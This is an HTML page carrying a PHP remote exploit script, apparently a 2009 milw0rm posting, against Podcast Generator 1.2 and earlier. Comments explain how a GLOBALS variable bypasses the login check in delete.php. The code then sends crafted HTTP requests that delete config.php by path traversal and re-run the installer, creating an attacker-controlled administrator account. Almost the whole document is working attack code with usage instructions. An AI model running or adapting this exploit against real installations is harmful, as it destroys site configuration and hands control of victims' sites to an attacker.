<html><head><title>Podcast Generator <= 1.2 unauthorized Re-Installation Remote Exploit</title></head><pre>&lt;?php
#
# Podcast Generator &lt;= 1.2 unauthorized CMS Re-Installation Remote Exploit
# 
# by staker
# --------------------------------------
# mail: staker[at]hotmail[dot]it
# url: http://podcastgen.sourceforge.net
# -------------------------------------- 
# 
# it works with register_globals=on
#  
# short explanation:
#
# ---------------------------------------- 
# Podcast Generator contains one flaw that
# allows an attacker to re-install the cms
# because of unlink() in 'delete.php' file
# ----------------------------------------
# Look at '/core/admin/delete.php'
# (removed author's comments)
/*

&lt;?php
if (isset($_REQUEST['absoluteurl']) OR isset($_REQUEST['amilogged']) OR isset($_REQUEST['theme_path'])) 
{  exit; } &lt;-------- {1}

if ($amilogged != &quot;true&quot;) { exit; } &lt;-------{2}

    if (isset($_GET['file']) AND $_GET['file']!=NULL) {
    $file = $_GET['file']; 
     $ext = $_GET['ext'];
	
	if (file_exists(&quot;$absoluteurl$upload_dir$file.$ext&quot;)) { 
		unlink (&quot;$upload_dir$file.$ext&quot;); &lt;--------{3}
		$PG_mainbody .=&quot;&lt;p&gt;&lt;b&gt;$file.$ext&lt;/b&gt; $L_deleted&lt;/p&gt;&quot;;
	}


*/
#
# Explanation (code snippet above [points])
# -----------------------------------------------------------------------------------
# 1. blocks all 'amilogged' REQUEST variables,what about GLOBALS?,therefore useless!
# 2. if 'amilogged' isn't true -&gt; exit() function activated. 
# 3. unlink() delete an existing file.
# -----------------------------------------------------------------------------------
#
# It's possible to delete 'config.php' to re-install the cms. we need 'amilogged'
# set to true. We can do it using a GLOBALS variable.
#
# admin/core/delete.php?GLOBALS[amilogged]=true&amp;file=../../config&amp;ext=php
# 
# Various:
# --------------------------------------------------
# They didn't help me but i want to give a thanks to 
# girex,skerno,Chaomel,XaDoS,Dante90 and Gianluka_95   
# --------------------------------------------------
# Today is: 02 June 2009. 
# Location: Italy,Turin.
# http://www.youtube.com/watch?v=dBc7mK5iAH0
# --------------------------------------------------

error_reporting(E_STRICT ^ E_WARNING);

if ($argc &lt; 2) start_usage();            

$host = $argv[1];
$path = $argv[2];

re_install();

function send_request($data)
{        
        global $host;
        
        if (!$sock = @fsockopen($host,80)) {
               die(&quot;connection refused..\n&quot;);
        }
        
        if (isset($data)) { 
               fputs($sock,$data);
        } 
               
        while (!feof($sock)) { $result .= fgets($sock); }           
        
        fclose($sock);
        return $result;
}


function remove_config()
{ 
        global $host,$path;
        
        $in_lex = &quot;/{$path}/core/admin/delete.php?GLOBALS[amilogged]=true&amp;file=../../config&amp;ext=php&quot;;
        
        $config  = &quot;GET {$in_lex} HTTP/1.1\r\n&quot;;
        $config .= &quot;User-Agent: Lynx (textmode)\r\n&quot;;
        $config .= &quot;Host: {$host}\r\n&quot;;
        $config .= &quot;Connection: close\r\n\r\n&quot;;
        
        $lol = send_request($config);
        
        if (check_config() != FALSE) {
              die(&quot;register_globals=off, exploit failed!\n&quot;);
        }
        else {
             return true;
        }           
}


function re_install()
{ 
        global $host,$path;
       
        $binary = &quot;username=staker&amp;password=killingyourself&amp;password2=killingyourself&amp;setuplanguage=en&quot;; 
         
        $config  = &quot;POST {$path}/setup/index.php?step=5 HTTP/1.1\r\n&quot;;
        $config .= &quot;User-Agent: Lynx (textmode)\r\n&quot;;
        $config .= &quot;Host: {$host}\r\n&quot;;
        $config .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
        $config .= &quot;Content-Length: &quot;.strlen($binary).&quot;\r\n&quot;;
        $config .= &quot;Connection: close\r\n\r\n&quot;;
        $config .= $binary;
        
        remove_config();
        $content = send_request($config);
        
        
        if (eregi('Creation of the configuration file',$content)) {
             echo &quot;[ re-installed successful\n&quot;;
             echo &quot;[ username: staker\n[ password: killingyourself\n&quot;; exit(0);
        }
        else {
             die(&quot;Exploit failed\n&quot;);
        }                 
}
       



function check_config()
{ 
        global $host,$path;
        
        $config  = &quot;GET /{$path}/config.php HTTP/1.1\r\n&quot;;
        $config .= &quot;User-Agent: Lynx (textmode)\r\n&quot;;
        $config .= &quot;Host: {$host}\r\n&quot;;
        $config .= &quot;Connection: close\r\n\r\n&quot;;
        
        $content = send_request($config);
        
        if (ereg('HTTP/1.1 404 Not Found',$content))  {
              return false;
        }      
        else {
              return true;            
        }
}


function start_usage()
{
         print &quot;[*--------------------------------------------------------------------------*]\n&quot;.
               &quot;[* Podcast Generator &lt;= 1.2 unauthorized CMS Re-Installation Remote Exploit *]\n&quot;.
               &quot;[*--------------------------------------------------------------------------*]\n&quot;. 
               &quot;[* Usage: php podcast_xpl.php [host] [path]                                 *]\n&quot;.
               &quot;[* [host] host -&gt; example: localhost                                        *]\n&quot;.
               &quot;[* [path] path -&gt; example: /podcast                                         *]\n&quot;.
               &quot;[*--------------------------------------------------------------------------*]\n&quot;;
         die();       
}

# milw0rm.com [2009-06-03]</pre></html>